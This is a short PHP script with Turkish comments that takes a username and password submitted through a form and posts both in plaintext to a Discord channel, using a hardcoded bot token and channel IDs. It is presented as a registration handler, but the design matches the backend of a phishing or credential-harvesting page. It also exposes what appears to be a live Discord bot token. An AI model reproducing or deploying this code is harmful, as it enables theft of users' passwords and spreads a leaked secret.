<?php
// Discord botunuzun token'ı
$bot_token = "MTIwNzc1MDA5MDcxOTEwMDkzOQ.Gr4RLy.xcKY-Bioswt69MA5wVboSBzwsZp0N40mEtN7r0";

// Göndermek istediğiniz sunucunun ID'si
$server_id = "1207747519514415124";

// Göndermek istediğiniz kanalın ID'si
$channel_id = "1207747519514415127";

// Post edilen verileri al
$kullaniciAdi = $_POST["kullaniciAdi"];
$sifre = $_POST["sifre"];

// Mesajı oluştur
$mesaj = "Yeni kullanıcı kaydı:\nKullanıcı Adı: $kullaniciAdi\nŞifre: $sifre";

// Discord API'ye POST isteği yapacak olan URL
$discord_api_url = "https://discord.com/api/v9/channels/{$channel_id}/messages";

// Mesaj verisi
$data = array(
    "content" => $mesaj
);

// POST isteği oluşturma
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => $discord_api_url,
    CURLOPT_HTTPHEADER => array(
        "Authorization: Bot {$bot_token}",
        "Content-Type: application/json"
    ),
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true
));

// İsteği gerçekleştirme
$response = curl_exec($ch);
curl_close($ch);

// İsteğin sonucunu kontrol etme
if ($response === false) {
    echo "Mesaj gönderilirken bir hata oluştu: " . curl_error($ch);
} else {
    echo "Kullanıcı bilgileri başarıyla Discord sunucusuna gönderildi!";
}
?>
